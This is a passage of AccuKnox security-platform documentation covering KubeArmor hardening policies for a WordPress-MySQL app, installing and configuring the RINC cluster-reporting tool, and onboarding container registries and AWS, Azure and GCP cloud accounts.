Navigate to the Runtime Protection\u2192 Policies and select the cluster and namespace where the WordPress-MySQL application is deployed. </p> <p>Step 2: In the screen select the hardening policies in the policy filter section to view the hardening policies related to the WordPress-MySQL application.  Step 3: Click on the WordPress package manager execution hardening policy from the list of policies to see the policy </p> <p>The Hardening policy is blocking the execution of any package management tools inside the WordPress pod. <pre><code>    apiVersion: security.kubearmor.com/v1\n    kind: KubeArmorPolicy\n    metadata:\n    name: harden-wordpress-pkg-mngr-exec\n    namespace: wordpress-mysql\n    spec:\n    action: Block\n    message: Alert! Execution of package management process inside container is denied\n    process:\n        matchPaths:\n        - path: /usr/bin/apt\n        - path: /usr/bin/apt-get\n        - path: /bin/apt-get\n        - path: /sbin/apk\n        - path: /bin/apt\n        - path: /usr/bin/dpkg\n        - path: /bin/dpkg\n        - path: /usr/bin/gdebi\n        - path: /bin/gdebi\n        - path: /usr/bin/make\n        - path: /bin/make\n        - path: /usr/bin/yum\n        - path: /bin/yum\n        - path: /usr/bin/rpm\n        - path: /bin/rpm\n        - path: /usr/bin/dnf\n        - path: /bin/dnf\n        - path: /usr/bin/pacman\n        - path: /usr/sbin/pacman\n        - path: /bin/pacman\n        - path: /sbin/pacman\n        - path: /usr/bin/makepkg\n        - path: /usr/sbin/makepkg\n        - path: /bin/makepkg\n        - path: /sbin/makepkg\n        - path: /usr/bin/yaourt\n        - path: /usr/sbin/yaourt\n        - path: /bin/yaourt\n        - path: /sbin/yaourt\n        - path: /usr/bin/zypper\n        - path: /bin/zypper\n    selector:\n        matchLabels:\n        app: wordpress\n    severity: 5\n    tags:\n    - NIST\n    - NIST_800-53_CM-7(4)\n    - SI-4\n    - process\n    - NIST_800-53_SI-4\n</code></pre></p> <p>Step 4: To apply this policy, select the policy checkbox and click Apply option </p> <p>Step 5: The policy goes into the pending state for approval. </p> <p>Step 6: To approve the policy click on the Pending icon, review changes and approve</p> <p> Step 7: Now the policy is active and applied on the cluster  Step 8: If any attacker tries to install any binary inside the WordPress pod it will be blocked and we will be getting alerts.  Step 9: To see the logs Navigate to the Monitoring/logging\u2192logs </p> <p>Thus we have prevented the remote code execution in the WordPress pod using AccuKnox\u2019s CWPP protection.</p>"},{"location":"getting-started/wordpress-mysql/#file-integrity-monitoring","title":"File Integrity Monitoring","text":"<p>In the MySQL application, certain folders will be having certain critical data which can be allowed to access but not modified. So using our AccuKnox hardening policy we are going to prevent the modification of contents inside these critical folders.</p> <p>Before applying the policy: Currently, any attacker who gets access to the bash or shell of the MySQL pod can modify the contents of the sbin folder by creating a new file and editing the old files.</p> <p></p> <p>Now we are going to prevent this using AccuKnox CWPP Solution.</p> <p>Step 1:  Navigate to the Runtime Protection\u2192 Policies and select the cluster and namespace where the WordPress-MySQL application is deployed.</p> <p> Step 2: In the screen select the hardening policies in the policy filter section to view the hardening policies related to the WordPress-MySQL application.</p> <p> Step 3: Click on the MySQL file integrity hardening policy from the list of policies to see the policy </p> <p>The policy is allowing users to access the critical folders but it is blocking the write or modify access by whitelisting only read access. <pre><code>    apiVersion: security.kubearmor.com/v1\n    kind: KubeArmorPolicy\n    metadata:\n    name: harden-mysql-file-integrity-monitoring\n    namespace: wordpress-mysql\n    spec:\n    action: Block\n    file:\n        matchDirectories:\n        - dir: /sbin/\n        readOnly: true\n        recursive: true\n        - dir: /usr/bin/\n        readOnly: true\n        recursive: true\n        - dir: /usr/lib/\n        readOnly: true\n        recursive: true\n        - dir: /usr/sbin/\n        readOnly: true\n        recursive: true\n        - dir: /bin/\n        readOnly: true\n        recursive: true\n        - dir: /boot/\n        readOnly: true\n        recursive: true\n    message: Detected and prevented compromise to File integrity\n    selector:\n        matchLabels:\n        app: mysql\n    severity: 1\n    tags:\n    - NIST\n    - NIST_800-53_AU-2\n    - NIST_800-53_SI-4\n    - MITRE\n    - MITRE_T1036_masquerading\n    - MITRE_T1565_data_manipulation\n</code></pre></p> <p>Step 4: To apply this policy, select the policy checkbox and click Apply option</p> <p></p> <p>Step 5: The policy goes into the pending state for approval.</p> <p></p> <p>Step 6: To approve the policy click on the Pending icon, review changes and approve</p> <p> Step 7: Now the policy is active and applied on the cluster</p> <p> Step 8: If any attacker now tries to modify the content of the critical folders it will be blocked.</p> <p> Step 9: To see the logs Navigate to the Monitoring/logging\u2192logs</p> <p></p> <p>Thus the file integrity of the MySQL pod is maintained using the AccuKnox CWPP security solution.</p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/","title":"Getting Started","text":"<p>Cloud Accounts</p> <p>Workloads</p> <p>ASPM</p> <p>AI/ML Security</p> <p>Container Registry</p> <p>Open Source</p> <p>Signup/Login via SSO</p> <p>Create Tokens</p> <p>Create Labels</p> <p>Reports</p>"},{"location":"how-to/RINC/","title":"RINC - A Getting Started Guide","text":"<p>RINC (short for \"Reporting IN Cluster\") is a simple and lightweight reporting tool that provides insights into the status of a Kubernetes cluster, as well as other services running within it.</p> <p>It includes built-in alerting capabilities, allowing users to define alerts using an expression language. RINC comes with a set of practical and sensible pre-configured alerts, which are included in the provided Helm charts. If you need to customize or extend these alerts, you can easily do so using our expression language, which is powered by the gval Go library.</p> <p>RINC also supports email integration, allowing you to receive alerts via email.</p>"},{"location":"how-to/RINC/#supported-reports","title":"Supported reports","text":"<ul> <li> <p>Kubernetes deployment and statefulset status reports</p> </li> <li> <p>Long-running job reports</p> </li> <li> <p>Registry scan job status reports</p> </li> <li> <p>Supports reporting jobs where the module container has succeeded but the artifact-api container has failed.</p> </li> <li> <p>Kubernetes deployment and statefulset image tag reports</p> </li> <li> <p>RabbitMQ metrics reports</p> </li> <li> <p>CEPH metrics reports</p> </li> <li> <p>Pod status reports</p> </li> <li> <p>PV Utilization report</p> </li> <li> <p>Pod &amp; Node resource utilization report</p> </li> <li> <p>Token expiry report</p> </li> <li> <p>Nodes' time-in-sync report</p> </li> <li> <p>Connectivity &amp; Status checks for,</p> </li> <li> <p>Vault</p> </li> <li> <p>MongoDB</p> </li> <li> <p>Redis/KeyDB</p> </li> <li> <p>Neo4j</p> </li> <li> <p>Postgresql</p> </li> <li> <p>Prometheus</p> </li> <li> <p>Metabase</p> </li> <li> <p>AWS RDS</p> </li> <li> <p>Weaviate</p> </li> <li> <p>Onboarded registries status report</p> </li> <li> <p>Kueue workload status report</p> </li> <li> <p>Supports reporting jobs where the module container has succeeded but the artifact-api container has failed.</p> </li> </ul>"},{"location":"how-to/RINC/#installation","title":"Installation","text":"<p>We recommend installing RINC through our provided helm charts.</p> <p>Note: RINC uses MongoDB as its data store and creates a new collection called \"rinc\" upon launch. It is recommended that you create a separate MongoDB user with R/W access to the \"rinc\" collection. See the section on Minimum Required Database Permissions.</p> <pre><code>VERSION=0.9.0\n\nhelm show values oci://public.ecr.aws/k9v9d5v2/accuknox-rinc --version \"$VERSION\" &gt; values.yaml\n</code></pre> <p>The file <code>values.yaml</code> is well-documented and includes all configurable options for <code>RINC</code>. Please go through it and adjust the values as needed to suit your preferences. See passing database/vault credentials to RINC.</p> <p>By default, all reports are disabled and can be enabled by setting <code>enable</code> to <code>true</code> in the Helm chart values. For example, to enable the RabbitMQ report, set:</p> <pre><code>config:\n  rabbitmq:\n    enable: true\n</code></pre> <p>If you are using our Accuknox Helm charts, we provide an <code>accuknox-values.yaml</code> file with most of the values pre-configured.</p> <pre><code>helm pull oci://public.ecr.aws/k9v9d5v2/accuknox-rinc --version \"$VERSION\"\ntar xvzf \"accuknox-rinc-$VERSION.tgz\"\nless accuknox-rinc/accuknox-values.yaml\n</code></pre> <p>RINC supports reading secrets directly from Vault. If you are using Hashicorp's Vault, please refer to the section on vault.</p> <p>After customizing the values to your preferences, run the Helm install command below to deploy <code>RINC</code> in your cluster:</p> <pre><code>NAMESPACE=\"accuknox-rinc\"\n\nhelm upgrade rinc oci://public.ecr.aws/k9v9d5v2/accuknox-rinc \\\n    --install \\\n    --namespace \"$NAMESPACE\" \\\n    --create-namespace \\\n    --version \"$VERSION\" \\\n    --values values.yaml\n</code></pre> <p>To check if everything is healthy, run:</p> <pre><code>watch kubectl -n \"$NAMESPACE\" get pod,job,cronjob,secret,configmap\n</code></pre> <p>If everything appears healthy and running, congratulations! RINC has been successfully installed on your cluster.</p>"},{"location":"how-to/RINC/#passing-database-credentials","title":"Passing Database Credentials","text":"<p>Database credentials are used for connectivity checks. There are 3 ways to pass your database credentials to RINC,</p>"},{"location":"how-to/RINC/#1-using-helm","title":"1. Using Helm:","text":"<p>Set <code>secretConfig.create</code> to true in the helm values and fill the secrets below to let Helm create a Kubernetes Secret that is mounted into RINC.</p> <pre><code>secretConfig:\n  create: true\n  config:\n    mongodb:\n      ###          ###\n      ### REDACTED ###\n      ###          ###\n</code></pre>"},{"location":"how-to/RINC/#2-manually-creating-a-secret","title":"2. Manually Creating a Secret:","text":"<p>Below is a template for the Secret manifest,</p> <pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n  name: credentials\n  namespace: accuknox-rinc\ntype: Opaque\nstringData:\n  secret.yaml: |-\n    # Please fill in the configuration below if you have set `vault.use` to\n    # true above.\n    vault:\n      auth:\n        # vault auth type\n        #\n        # Possible values: \"token\", \"kubernetes\"\n        type: \"\"\n        # Token used to authenticate to vault. Required when auth type is set to\n        # \"token\".\n        token: \"\"\n        # Role name used to authenticate to vault. Required when auth type is set\n        # to \"kubernetes\".\n        role: \"\"\n    # Service-specify credentials.\n    #\n    # It is recommended to create a dedicated `rinc` user for each of the\n    # services.\n    mongodb:\n      username: \"\"\n      password: \"\"\n    email:\n      smtp:\n        host: \"\"\n        username: \"\"\n        password: \"\"\n        port: 587\n    rabbitmq:\n      management:\n        # basic auth username for the management api.\n        username: \"\"\n        # basic auth password for the management api.\n        password: \"\"\n    ceph:\n      # ceph reporter uses ceph's dashboard API to scrape ceph status and\n      # metrics.\n      dashboardAPI:\n        # username to authenticate with ceph dashboard API.\n        username: \"\"\n        # password to authenticate with ceph dashboard API.\n        password: \"\"\n    connectivity:\n      neo4j:\n        # neo4j basic auth username\n        username: \"\"\n        # neo4j basic auth password\n        password: \"\"\n      postgres:\n        # postgresql auth username.\n        username: \"\"\n        # postgresql auth password.\n        password: \"\"\n      rds:\n        # aws access key id\n        accessKeyId: \"\"\n        # aws secret access key\n        secretAccessKey: \"\"\n    tokenExpiry:\n      # list of token whose expiry need to be checked.\n      #\n      # It is recommended to NOT specify the token value here as it will remain\n      # static. If you are using Vault, you can specify the vault `path` as\n      # documented in the `config` section. If you are NOT using Vault, you can\n      # use ExternalSecrets that will periodically sync the token value.\n      tokens: []\n        # - name: \"\"\n        #   value: \"\"\n    cloudScan:\n      onboardedRegistries:\n        postgres:\n          # postgresql auth username.\n          username: \"\"\n          # postgresql auth password.\n          password: \"\"\n</code></pre> <p><code>kubectl apply -f credentials.yaml</code></p> <p>This secret must then be referenced in the helm chart values,</p> <pre><code># This section is for specifying an existing Kubernetes Secret that the Helm\n# chart should reference\nexistingSecret:\n  # name of the existing Secret in the Kubernetes cluster\n  name: \"credentials\"\n  # key within the Secret, which corresponds to the specific value to be used.\n  key: \"secret.yaml\"\n</code></pre>"},{"location":"how-to/RINC/#3-reading-credentials-directly-from-vault","title":"3. Reading credentials directly from Vault","text":"<p>RINC can read credentials directly from Vault. To configure RINC to connect to Vault, specify the connection details in the Helm values under <code>secretConfig.config.vault</code> and ensure that <code>secretConfig.create</code> is set to <code>true</code>. Helm will pass the Vault credentials to RINC via the created Kubernetes Secret, allowing RINC to use these credentials to connect to Vault and read the remaining credentials directly from it.</p> <p>See the section on Vault for setting up the required Vault policies.</p> <pre><code>secretConfig:\n  create: true\n  config:\n    # Please fill in the configuration below if you have set `vault.use` to\n    # true above.\n    vault:\n      auth:\n        # vault auth type\n        #\n        # Possible values: \"token\", \"kubernetes\"\n        type: \"\"\n        # Token used to authenticate to vault. Required when auth type is set to\n        # \"token\".\n        token: \"\"\n        # Role name used to authenticate to vault. Required when auth type is set\n        # to \"kubernetes\".\n        role: \"\"\n</code></pre>"},{"location":"how-to/RINC/#accessing-rincs-web-interface","title":"Accessing RINC's web interface","text":"<p>By default, RINC is not exposed to the outside world. To access RINC's web interface, port-forward to the <code>rinc-web</code> service:</p> <p><code>kubectl -n \"$NAMESPACE\" port-forward svc/rinc-web 8080:80</code></p> <p>Now open <code>&lt;http://localhost:8080</code>&gt; in your browser.</p>"},{"location":"how-to/RINC/#an-overview-of-rincs-web-interface","title":"An overview of RINC's web interface","text":"<p>If you open RINC's web interface immediately after installation, the reporting cronjob might not have scheduled yet, so you may see an empty welcome screen instead of the dashboard. However, don't worry - you can go to the <code>Console</code> by clicking on the top-right section of the page and start an \"on-demand scan\".</p> <p></p> <p>This will immediately launch a Kubernetes Job to aggregate all the metrics and generate a report for you. The job will take some time depending on the size of your cluster and workloads. Once the job is completed, you will see a dashboard similar to the example above.</p>"},{"location":"how-to/RINC/#an-overview-of-the-reports-generated-by-rinc","title":"An overview of the reports generated by RINC","text":"<p>Above is an example RabbitMQ report.</p> <p>Every report begins with an Alerts section, displaying any fired alerts. The alerts are color-coded based on their severity:</p> <ol> <li> <p>Red - Indicates a critical alert.</p> </li> <li> <p>Yellow - Indicates a warning.</p> </li> <li> <p>Info - Provides useful information.</p> </li> </ol> <p>Critical alerts typically require immediate action. Warning alerts, if not addressed in time, may impact operations. Info alerts provide useful details, such as the number of onboarded registries and nodes.</p> <p>As a cluster operator, ensure there are no critical alerts.</p> <p>Note: As described earlier, RINC supports email integration, allowing you to receive these alerts via email. Refer to the <code>email</code> section in the Helm chart to configure email integration.</p> <p>The rest of the report varies depending on the type of report and includes insights about the cluster/service.</p>"},{"location":"how-to/RINC/#fetching-old-reports","title":"Fetching Old Reports","text":"<p>RINC retains old reports for the duration specified in <code>config.maintenance.metricsRetention</code> in the Helm values. To retrieve old reports, click on <code>History</code> at the top-right of the web interface to access the history page.</p> <p></p> <p>History Page</p> <p>On this page, select the desired date to fetch the reports and click <code>Search</code>.</p> <p></p> <p>History Search Results - All times are in UTC.</p>"},{"location":"how-to/RINC/#advanced","title":"Advanced","text":""},{"location":"how-to/RINC/#minimum-required-database-permissions-for-rinc-to-generate-reports","title":"Minimum Required Database Permissions for RINC to Generate Reports","text":"<p>MongoDB:</p> <p>RW access to the <code>rinc</code> collection</p> <p>Postgresql:</p> <p>SELECT access to the following within the <code>cwpp</code> schema (within the <code>accuknox</code> database) tables,</p> <ol> <li> <p>registry_scan_details</p> </li> <li> <p>registries</p> </li> <li> <p>image_scan_details</p> </li> <li> <p>registry_configuration</p> </li> <li> <p>workspaces</p> </li> <li> <p>clusters</p> </li> <li> <p>node</p> </li> </ol> <p>The query below creates a user named <code>rinc</code> with SELECT access to the listed tables under the <code>cwpp</code> schema.</p> <pre><code>CREATE USER rinc WITH PASSWORD 'tryguessingthis';\nGRANT CONNECT ON DATABASE accuknox TO rinc;\nGRANT USAGE ON SCHEMA cwpp TO rinc;\nGRANT SELECT ON\n    cwpp.registry_scan_details,\n    cwpp.registries,\n    cwpp.image_scan_details,\n    cwpp.registry_configuration,\n    cwpp.workspaces,\n    cwpp.clusters,\n    cwpp.nodes\nTO rinc;\n</code></pre> <p>Neo4j:</p> <p>Neo4j requires authentication to ping the database. It is recommended you created a separate database called \"rinc\" and a user, also called \"rinc\". This database is not going to be used and is only present to allow RINC to authenticate with neo4j in order to test the connectivity.</p>"},{"location":"how-to/RINC/#vault-policy","title":"Vault Policy","text":"<p>If you are using Vault with Kubernetes auth, create a role and attach the necessary policy to allow reading your configured secrets.</p> <p>Example, vault policy:</p> <pre><code>path \"/accuknox/k8s/*\" {\n  capabilities = [\"read\"]\n}\n\npath \"/accuknox/aws/*\" {\n  capabilities = [\"read\"]\n}\n\npath \"/accuknox/artifacts/microservices/token\" {\n  capabilities = [\"read\"]\n}\n</code></pre> <p>You also need to bind the role to the service accounts and namespace. RINC helm charts creates three service accounts. You can list them using,</p> <p><code>kubectl -n \"$NAMESPACE\" get serviceaccounts</code></p> <p>You should associate the role with all three service account names.</p> <p>Once the role is created, refer to it in the Vault section of the Helm chart.</p>"},{"location":"how-to/acr/","title":"Azure Container Registry (ACR) Onboarding","text":"<p>AccuKnox CSPM security tool scans images that are present in the onboarded Azure Container Registry and can find the risks and vulnerabilities associated with these images. The risks are identified and shown in the scan results. Users will get a comprehensive view of these risks and vulnerabilities in the dashboard along with their remediation.</p>"},{"location":"how-to/acr/#steps-to-generate-credentials-for-onboarding-acr","title":"Steps to generate credentials for onboarding ACR","text":"<p>Step 1: Open the Azure Management Console and sign in with your Azure account credentials. Search for the Container Registry service in the search bar.</p> <p></p> <p>Step 2: Click on the name of the registry to be onboarded. In the navigation menu for the container registry, click on Access Keys under the Settings section.</p> <p></p> <p>Step 3: Click on the Admin User checkbox to activate Admin access.</p> <p></p> <p>Copy the generated Login Server, Username, and Password for onboarding on AccuKnox SaaS.</p>"},{"location":"how-to/acr/#steps-to-onboard-acr-registry-on-accuknox","title":"Steps to Onboard ACR Registry on AccuKnox","text":"<p>Step 1: In the AccuKnox dashboard, under Issues, click on \"Registry Scan\"</p> <ul> <li>Alternatively, you can go to \"Settings \u2192 Integration \u2192 Registry Scan\"</li> </ul> <p>Now, click on \"Add Registry\"</p> <p></p> <p>Step 2: Enter any Registry Name and Description. Select Registry Type as ACR and paste the Login Server, Username, and Password that was copied.</p> <p>Provide the Tag pattern and schedule a time( using the cron expression) for the scanning. If you need to trigger the scan after saving, click the \"Trigger scan on save\" checkbox.</p> <p>Step 3: After providing all the information, click on \"Test Connection\", it should show \"Registry Tested Successfully\".</p> <p>Now, click on Save.</p> <p></p>"},{"location":"how-to/acr/#configure-advanced-settings","title":"Configure Advanced Settings","text":""},{"location":"how-to/acr/#image-updated-within-last","title":"Image Updated Within Last","text":"<p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images updated within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the update time.</p> </li> </ul>"},{"location":"how-to/acr/#image-pulled-within-last","title":"Image Pulled Within Last","text":"<p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images pulled within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the pull time.</p> </li> </ul> <p></p>"},{"location":"how-to/acr/#nametag-pattern","title":"Name/Tag Pattern:","text":"<p>Specify patterns to include or exclude images for scanning. Use the <code>-</code> symbol to explicitly exclude patterns.</p> <p>By default, images are excluded unless explicitly included through patterns.</p> <p>To exclude specific images, use the <code>-</code> symbol. For example: - To exclude <code>cwpp/ubuntu:v1</code>, use the pattern <code>-*:v1</code>. - To include <code>cwpp/ubuntu:latest</code>, specify a pattern like <code>*:latest</code>.</p> <p>Note: Only images matching the pattern will be scanned. For instance, using <code>*:latest</code> ensures only images with the latest tags are scanned.</p> <p></p>"},{"location":"how-to/acr/#schedule-and-certificate","title":"Schedule and Certificate","text":"<p>Set the scan schedule using a CRON expression. For example: - CRON Expression: <code>18 minute 07 hour * day (month) * month * day (week)</code>.</p> <p></p> <p>Toggle Trigger Scan on Save to initiate the scan for the first time without waiting for the scheduled time.</p> <p>Step 4: After saving the registry, the scan will start based on the scheduled time, if the Trigger scan on save is checked the scan will start right after save. After saving the scan user will be redirected to Settings -&gt; Integrations -&gt; Registry. Here, we can see the list of onboarded registries and their details.</p> <p></p> <p>Alternatively, you can click on \"View Registry Scan\" from the list view and this will redirect to Issues \u2192 Registry Scan</p> <p>Once the scanning is completed, we can see the scan results</p> <p></p> <p>Under \"Findings\", you can find the scanned registry.</p> <p>To view the details of your registry, you can use filters such as \"registry_type\", and then select the \"acr\" registry you can also use the filter \"registry_name\" and provide the name of your registry.</p> <p></p> <p>By clicking on the repositories, we can get more details about the scan results.</p> <p></p>"},{"location":"how-to/administrators-guide/","title":"Administrator's Guide","text":"<p>Purpose of this Guide</p> <ul> <li>Provides step-by-step guidance for onboarding, deployment, and configuration</li> <li>Includes task-oriented assets, installation steps, and configuration references</li> <li>Ideal for technical users seeking actionable, operational documentation</li> <li>Download the AccuKnox Administrator's Guide PDF \ud83d\udce9.</li> </ul>"},{"location":"how-to/administrators-guide/#table-of-contents","title":"Table of Contents","text":"Getting Started &amp; Installation <ul> <li>AccuKnox Architecture Overview</li> <li>On-prem Installation</li> <li>Runtime Security Prerequisites</li> <li>Signup/Login via SSO</li> </ul> Cloud Accounts Onboarding <ul> <li>Cloud Accounts Overview</li> <li>AWS Prerequisites</li> <li>AWS Onboarding</li> <li>AWS Organization Onboarding</li> <li>Azure Prerequisites</li> <li>Azure Onboarding</li> <li>GCP Prerequisites</li> <li>GCP Onboarding</li> <li>Offboard Cloud Account</li> </ul> Kubernetes Security Onboarding <ul> <li>Kubernetes Security Onboarding Overview</li> <li>Runtime Security Onboarding</li> <li>Cluster Onboarding with Access Keys</li> <li>Cluster Misconfiguration Scan Onboarding</li> <li>CIS Benchmarking</li> <li>Cluster Offboarding</li> <li>Security on OpenShift</li> </ul> VM / Host-Based Workload Onboarding <ul> <li>VM Onboard/Deboard with Docker</li> <li>VM Onboard/Deboard with SystemD</li> <li>SystemD Based Non-BTF Environments</li> <li>VM Onboarding with Access Keys</li> </ul> Container Registry &amp; Scanner Setup <ul> <li>In-Cluster Image Scanner via Helm</li> <li>DockerHub Registry Integration</li> <li>JFrog Container Registry Setup</li> </ul> Reports, Monitoring &amp; Health Tools <ul> <li>Generate CWPP Reports</li> <li>Configure Custom Report</li> <li>Health Monitoring (RINC)</li> </ul> <p>Need Help?</p> <p>For troubleshooting, advanced configuration support, or integration queries, please refer to:</p> <ul> <li>CWPP Troubleshooting</li> <li>CSPM Troubleshooting</li> <li>Technical Support Guide</li> </ul> <p></p>"},{"location":"how-to/aiml-aws-onboard/","title":"AWS AI/ML Cloud Onboarding","text":"<p>In this section we can find the steps to onboard an AWS cloud account to the AccuKnox SaaS platform.</p> <p>AI/ML Prerequisites for AWS Cloud Accounts</p> <p>Please review the AI/ML Prerequisites for AWS before proceeding with the onboarding process.</p>"},{"location":"how-to/aiml-aws-onboard/#aws-iam-user-creation","title":"AWS IAM User Creation","text":"<p>Please follow the following steps to provide a user with appropriate read access:</p> <p>Step 1: Navigate to IAM \u2192 Users and click on Add Users</p> <p></p> <p>Step 2: Give a username to identify the user</p> <p></p> <p>Step 3: In the \"Set Permissions\" screen:</p> <p>a. Select \"Attach policies directly\"</p> <p>b. Search \"ReadOnly\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>c. Search \"SecurityAudit\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>Step 4: Finish creating the user. Click on the newly created user and create the Access key and Secret Key from the Security Credentials tab to be used in the AccuKnox panel</p> <p></p>"},{"location":"how-to/aiml-aws-onboard/#aws-onboarding","title":"AWS Onboarding","text":"<p>In this example we are onboarding AWS account using the Access Keys method.</p> <p>Step 1: To onboard Cloud Account Navigate to Settings\u2192cloud Accounts</p> <p></p> <p>Step 2: In the Cloud Account Page select Add Account option</p> <p></p> <p>Step 3: Select the AWS option</p> <p></p> <p>Step 4: In the next Screen select the labels and Tags field from the dropdown Menu.</p> <p></p> <p>Step 5: After giving labels and Tag in the Next Screen Provide the AWS account\u2019s Access Key and Secret Access Key ID and Select the Region of the AWS account. Ensure to check the box \"AI/ML Assets\" to enable AI/ML asset discovery and monitoring. Finally, click on the \"Add Account\" button to complete the onboarding process.</p> <p></p> <p>Step 6: AWS account is added to the AccuKnox using Access Key Method. We can see the onboarded cloud account by navigating to Settings\u2192cloud Accounts option.</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/aiml-azure-onboard/","title":"Azure AI/ML Cloud Onboarding","text":"<p>In this section we can find the steps to onboard an Azure cloud account to the AccuKnox SaaS platform</p> <p>AI/ML Prerequisites for Azure Cloud Accounts</p> <p>Please review the AI/ML Prerequisites for Azure before proceeding with the onboarding process.</p>"},{"location":"how-to/aiml-azure-onboard/#rapid-onboarding-via-azure","title":"Rapid Onboarding (via Azure)","text":"<p>For Azure Onboarding it is required to register an App and giving Security read access to that App from the Azure portal.</p> <p>Step 1: Go to your Azure Portal and search for App registrations and open it</p> <p></p> <p>Step 2: Here click on New registration</p> <p></p> <p>Step 3: Give your application a name, remember this name as it will be used again later, For the rest keep the default settings</p> <p></p> <p>Step 4: Now your application is created,  save Application ID and Directory ID as they will be needed to for onboarding on AccuKnox Saas and then click on \u2018Add a certificate or secret\u2019</p> <p></p> <p>Step 5: Click on new client secret and enter the name and expiration date to get secret id and secret value, save this secret value as this will also be needed for onboarding.</p> <p></p> <p>Step 6: Next, go to API permissions tab and click on 'Add  permission'</p> <p></p> <p>Step 7: On the screen that appears, click on 'Microsoft Graph'</p> <p></p> <p>Step 8: Next, select Application Permissions and then search for Directory.Read.All and click on Add permissions</p> <p></p> <p>Step 9: Select \u2018Grant Admin Consent\u2019 for Default Directory and click on \u2018Yes\u2019</p> <p></p> <p>Step 10: Now we need to give Security read permissions to this registered Application , to do that go to subscriptions</p> <p></p> <p>Step 11: First save the subscription ID and click on the subscription name , here it is \u201cMicrosoft Azure Sponsorship\u201c</p> <p></p> <p>Step 12: Navigate to Access control(IAM) and go to Roles , here select Add &gt; Add Custom Role</p> <p></p> <p>Create a custom role with the following actions: <code>Microsoft.MachineLearningServices/workspaces/onlineEndpoints/score/action</code> <code>Microsoft.MachineLearningServices/serverlessEndpoints/listKeys/action</code> <code>Microsoft.Storage/storageAccounts/listKeys/action</code> <code>Microsoft.MachineLearningServices/workspaces/batchEndpoints/score/action</code></p> <p>It will look similar to this (use the above listed permissions): </p> <p>Step 13: Next, we need to apply the Reader role. </p> <ol> <li>Go to the Azure Portal \u2192 Subscriptions (or Resource Groups) \u2192 select your target scope.</li> <li>Open Access control (IAM) \u2192 click Add &gt; Add role assignment.</li> <li>In the Role tab, select Reader, then click Next.</li> <li>Under Members, choose the user, service principal, or group \u2192 Review + assign to apply the Reader role.</li> </ol>"},{"location":"how-to/aiml-azure-onboard/#from-accuknox-saas-ui","title":"From AccuKnox SaaS UI","text":"<p>Configuring your Azure cloud account is complete, now we need to onboard the cloud account onto AccuKnox Saas Platform.</p> <p>Step 1: Go to settings\u2192 Cloud Account and click on Add Account</p> <p></p> <p>Step 2: Select Microsoft Azure as Cloud Account Type</p> <p></p> <p>Step 3: Select or create label and Tags that will be associated with this Cloud Account</p> <p></p> <p>Step 4: Enter the details that we saved earlier during the steps for app registration and subscription id from subscriptions in azure portal and click on connect. Ensure to check the box \"AI/ML Assets\" to enable AI/ML asset discovery and monitoring.</p> <p></p> <p>Step 5: After successfully connecting your cloud account will show up in the list</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/aiml-gcp-onboard/","title":"GCP AI/ML Cloud Onboarding","text":"<p>AI/ML Prerequisites for GCP Cloud Accounts</p> <p>Please review the AI/ML Prerequisites for GCP before proceeding with the onboarding process.</p> <p>Here, we will see the steps to onboard a GCP cloud account to the AccuKnox SaaS platform</p> <p>Note: Make sure the Below API Library is enabled in your GCP Account for onboarding into AccuKnox SaaS:</p> <ol> <li>Compute Engine API</li> <li>Identity and Access Management (IAM) API</li> <li>Cloud Resource Manager API</li> <li>Cloud Functions API</li> <li>KMS API</li> <li>Kubernetes API</li> <li>Cloud SQL Admin API</li> </ol> <p>For GCP there is a requirement for IAM Service Account Access.</p> <p>Step 1:  Log into your Google Cloud console and navigate to  IAM &amp; Admin choose \u201cRoles\u201c and Click \u201cCreate Role\u201c</p> <p></p> <p>Step 2:  Name the \u201cRole\u201d and Click \u201cAdd Permission\u201d</p> <p></p> <p>Step 3:  Use the Service: storage filter then value as \u201cstorage.buckets.getIamPolicy\u201c</p> <p></p> <p>Step 4: Choose the permission and Click \u201cAdd\u201c then Click Create in the same page.</p> <p></p> <p>Step 5:  In the Navigation Panel, navigate to IAM Admin &gt; Service Accounts.</p> <p></p> <p>Step 6: Click on \"Create Service Account\"</p> <p></p> <p>Step 7: Enter any name that you want on Service Account Name.</p> <p>Step 8: Click on Continue.</p> <p></p> <p>Step 9: Select the role: Project &gt; Viewer and click Add another Role.</p> <p></p> <p>Step 10: Click \u201cAdd Another Role\u201d Choose \u201cCustom\u201c Select the created Custom Role.</p> <p></p> <p>Step 11: Click on \u201cContinue\u201c and \u201dDone\u201d</p> <p></p> <p>Step 12: Go to the created Service Account, click on that Service Account navigate to the \u201cKeys\u201c section.</p> <p></p> <p>Step 13: Click the \u201cAdd key\u201c button and \u201cCreate new key \u201c . Chosen Key type should be JSON format.</p> <p></p> <p>Step 14: Click the \u201cCreate\u201c button it will automatically download the JSON key.</p>"},{"location":"how-to/aiml-gcp-onboard/#from-accuknox-saas-ui","title":"From AccuKnox SaaS UI","text":"<p>Step 1: Go to the AccuKnox SaaS. Navigate to the \u201cSettings\u201d \u2192 \u201cCloud Accounts\u201d then \u201cAdd Account\u201d.</p> <p></p> <p>Step 2: Click the \u201cGCP Platform\u201d</p> <p></p> <p>Step 3:  Create New Label and Add the Label for identifying the assets inside this account and add a Tag optionally.</p> <p></p> <p>Step 4:  Enter the \u201cProject ID\u201c, \u201cClient Email\u201d(The Service Account mail ID) and  \u201cPrivate Key\u201d from the downloaded File. Copy paste the entire downloaded file into the \u201dPrivate Key\u201d field . Ensure to check the box \"AI/ML Assets\" to enable AI/ML asset discovery and monitoring. Then Click \u201cConnect\u201c</p> <p></p> <p>The cloud account has been onboarded successfully</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/aiml-overview/","title":"AI/ML Security Onboarding","text":"<p>AccuKnox delivers platformized AI/ML security solutions to safeguard machine learning models, data pipelines, and AI-driven workloads from evolving threats. By applying Zero Trust principles, AccuKnox ensures robust protection across cloud, on-premises, and hybrid environments. AI/ML systems face unique risks such as model theft, data privacy breaches, adversarial attacks, and compliance challenges. Securing these systems is critical to protect intellectual property, maintain data integrity, and meet 